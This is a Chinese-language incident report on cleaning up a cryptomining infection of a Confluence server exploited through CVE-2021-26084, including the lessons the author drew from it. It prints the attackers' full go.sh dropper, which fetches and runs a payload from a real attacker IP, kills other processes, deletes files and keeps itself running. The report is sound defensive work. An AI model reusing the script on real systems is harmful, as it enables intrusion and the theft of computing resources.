# 1 事件回顾

### 1.1 发现异常

IDS日志巡检中发现一条连接矿池服务器的日志，按照以往的经验，看来又有一台服务器沦为矿机了。IDS日志如下：

![1630978941_6136c37d841b723f553bf.png!small?1630978941840](https://image.3001.net/images/20210907/1630978941_6136c37d841b723f553bf.png!small?1630978941840)

正好最近在测试一款所谓态势感知的流量分析设备，也有异常日志，这几乎是百分百确诊了，抓紧处理吧。

![1630978950_6136c386630b334a40b8b.png!small?1630978950706](https://image.3001.net/images/20210907/1630978950_6136c386630b334a40b8b.png!small?1630978950706)

经查，这台主机是Atlassian confluence服务器，目前版本是V7.5.1，对外开通80和443端口。

![1630978956_6136c38c209145e5d7f41.png!small?1630978956427](https://image.3001.net/images/20210907/1630978956_6136c38c209145e5d7f41.png!small?1630978956427)

### 1.2排查思路

根据近期的内网流量分析，公司内部并没有对该主机进行攻击的异常流量，所以首先想到的是来自外部攻击。外部攻击能成功肯定是利用了漏洞，包括主机漏洞和应用漏洞，如果是0day漏洞对于大多数用户来说是无能为力的，那看看是否有已知漏洞吧。所以排查的思路分两方面：排查是否有已知漏洞；找到木马程序及时清理。

# 2 排查步骤

### 2.1服务器漏洞扫描

漏扫结果发现两个漏洞，其中一个是nginx任意代码执行漏洞，需升级到最新版可以解决，立即完成升级并重启服务；另一个是jira相关漏洞，不过该漏洞是DDoS漏洞，与本次被中木马应该关系不大。

![1630978984_6136c3a87634877fd179d.png!small?1630978984775](https://image.3001.net/images/20210907/1630978984_6136c3a87634877fd179d.png!small?1630978984775)

### 2.2 Confluence漏洞信息查询

上*度搜confluence漏洞，查到的都是2019年的漏洞报道，这些漏洞在V7.5.1版本均已修复。

![1630978992_6136c3b03e7ee4f884b72.png!small?1630978992652](https://image.3001.net/images/20210907/1630978992_6136c3b03e7ee4f884b72.png!small?1630978992652)

### 2.3 检查网络连接状态

通过netstat命令查看网络连接状态，其中有一条与IDS和态势感知上均发现的矿池连接IP相同。

![1630979002_6136c3ba7ac5a7a5ef48c.png!small?1630979002822](https://image.3001.net/images/20210907/1630979002_6136c3ba7ac5a7a5ef48c.png!small?1630979002822)

### 2.4 查看资源占用情况

输入top命令，有多个confluence用户的进程，其中solrd进程明显异常，

![1630979010_6136c3c208e183528912d.png!small?1630979010417](https://image.3001.net/images/20210907/1630979010_6136c3c208e183528912d.png!small?1630979010417)

### 2.5 计划任务

使用命令crontab -l -u confluence查看计划任务，发现有个自动下载的任务

![1630979018_6136c3ca8b70763dbe90d.png!small?1630979018858](https://image.3001.net/images/20210907/1630979018_6136c3ca8b70763dbe90d.png!small?1630979018858)

### 2.6 可疑文件定位

通过对可疑进程solrd的搜索发现，在/tmp/.solrd路径下，有多个病毒文件，其中连接矿池的文件截图如下：

![1630979033_6136c3d96c0d7ab68acde.png!small?1630979033778](https://image.3001.net/images/20210907/1630979033_6136c3d96c0d7ab68acde.png!small?1630979033778)

并有go.sh文件，源码如下：

> #!/bin/sh  
> myName='.go.sh'  
> sName='bin/java'  
> mName='javac'  
> dlUrl='http://45.118.135.99:8881/'  
> downloader () {  
> if command -v wget &> /dev/null; then  
> wget $1 -O $2  
> elif command -v curl &> /dev/null; then  
> curl $1 -o $2  
> else  
> if test "`python -c "import sys; print(sys.version_info[0])"`" = "3" ; then  
> python -c "from urllib.request import urlopen; u = urlopen('"$1"');
> localFile = open('"$2"', 'wb'); localFile.write(u.read());
> localFile.close()"  
> else  
> python -c "from urllib import urlopen; u = urlopen('"$1"'); localFile =
> open('"$2"', 'wb'); localFile.write(u.read()); localFile.close()"  
> fi  
> fi  
> chmod +x $2  
> }  
> killer() {  
> if test "$(id -u)" -ne "0"  
> then  
> ps aux | grep -v $mName | grep -v $sName | grep -v $myName | awk '{print
> $2}' | while read procid  
> do  
> kill -9 $procid  
> done  
> rm -rf /tmp/.*  
> else  
> ps aux | grep -v $mName | grep -v $sName | grep -v $myName | awk
> '{if($3>30.0) print $2}' | while read procid  
> do  
> kill -9 $procid  
> done  
> pkill -9 python  
> pkill -f cryptonight  
> pkill -9 perl  
> rm -rf /tmp/.*  
> echo "" >> /etc/crontab  
> echo "exit 0" >> /etc/rc.local  
> fi  
> }  
> runer() {  
> downloader $dlUrl/codeR /tmp/$mName  
> chmod +x /tmp/$mName  
> /tmp/$mName && rm -f /tmp/$mName  
> }  
> ps aux | grep -v $mName | grep -v $sName | awk '{if($3>30.0) print $2}' |
> while read procid  
> do  
> kill -9 $procid  
> done  
> runer  
> while true; do  
> sleep 3  
> if test "$(ps -eo pid,command | grep $mName | grep -v grep | head -n 1 | awk
> '{print $1}')" -ne "0"; then  
> killer  
> else  
> runer  
> fi  
> done

### 2.7 木马查杀

9月3日上午，删除上述已知的进程、文件、计划任务，并观察半天，暂时未再现异常。

### 2.8 死灰复燃

9月6日（周一）一大早到单位先巡检一遍安全设备，发现confluence服务器又中木马了，而且这回威胁事件也多了，包括DDoS、矿池连接、公共矿池、恶意软件和僵尸网络，查看关联实体高达12个IP/域名，说明还可能不止一波人干的。

![1630979052_6136c3ec7dd47ab189f28.png!small?1630979052830](https://image.3001.net/images/20210907/1630979052_6136c3ec7dd47ab189f28.png!small?1630979052830)

查看日志详情，再次被植入木马的时间是9月4日（周六）晚上21点。

![1630979058_6136c3f24074cbe28d9dd.png!small?1630979058557](https://image.3001.net/images/20210907/1630979058_6136c3f24074cbe28d9dd.png!small?1630979058557)

### 2.9 Confluence漏洞信息再次查询

撇开口碑不怎么地的*度，用其他搜索引擎再次搜索confluence漏洞相关信息，发现在8月26日国内安全厂商360、绿盟等均有相关漏洞公告。

![1630979067_6136c3fb6ec1497079388.png!small?1630979067831](https://image.3001.net/images/20210907/1630979067_6136c3fb6ec1497079388.png!small?1630979067831)

![1630979073_6136c40125aadaec0fafb.png!small?1630979073449](https://image.3001.net/images/20210907/1630979073_6136c40125aadaec0fafb.png!small?1630979073449)

当然，Atlassian最先在其官网上也公告了该漏洞，并且已经发布了修复后的新版本。

![1630979077_6136c405baff249ed9a4d.png!small?1630979078066](https://image.3001.net/images/20210907/1630979077_6136c405baff249ed9a4d.png!small?1630979078066)

### 2.10 断开互联网

由于是远程任意代码执行漏洞，攻击者想上传什么代码就上传什么代码，如果传个勒索病毒那就麻烦大了，果断断开互联网连接，免得被进一步攻击。

### 2.11 Confluence升级到最新版本

联系Atlassian代理商升级confluence到最新版本，并再次清理木马，包括相关进程、文件、计划任务等。

## 3 事件总结

通过本次confluence木马的处理，有以下几点心得体会：

>
> 由于CVE-2021-26084是远程代码执行漏洞，漏洞的风险级别无须赘述，一定会有很多黑产团队在利用该漏洞，所以每个用户被黑的症状差异性会很大，看到这篇文章的用户如果您公司有用confluence一定第一时间升级到最新版，这也我是写这篇文章的初衷。
>
> 类似态势感知、IDS等的安全设备是很有必要的，因为它能让你第一时间掌握内网的安全情况，不需要再花更多的时间去排查异常情况，为应急响应争取更多的宝贵时间。
>
>
> 如果有条件，可以根据自身的业务定制威胁情报，因为威胁情报实在太多，安全负责人平时的事情也不少，海量的威胁情报实在看不过来，及时掌握漏洞信息，为应急响应争取更多时间。
>
>
> 翻开公司的合同样本，“如果乙方提供的产品有重大的安全漏洞，应第一时间书面通知甲方，并提供相应的修复方案，如因乙方的疏忽给甲方造成重大经济损失，甲方有权向乙方索赔”，如果没有这样的一条，一定要加上。本次confluence漏洞，当我们告知Atlassian代理商confluence有漏洞时，他们的答复是“这些是2019年的漏洞，早已经修复了”，说明在事发时，他们也没关注到Atlassian发布的高危漏洞。当我们告知对方最新的漏洞时，他们并不是立即给你升级，而是问合同到期日是什么时候，如果过期了无法直接升级。
>
> 慎用*度，慎用，慎用，如果我在周五就发现confluence的漏洞信息，我周五第一时间就能处理完毕，假如后面周六晚上被植入的是勒索病毒了，想想都后怕。

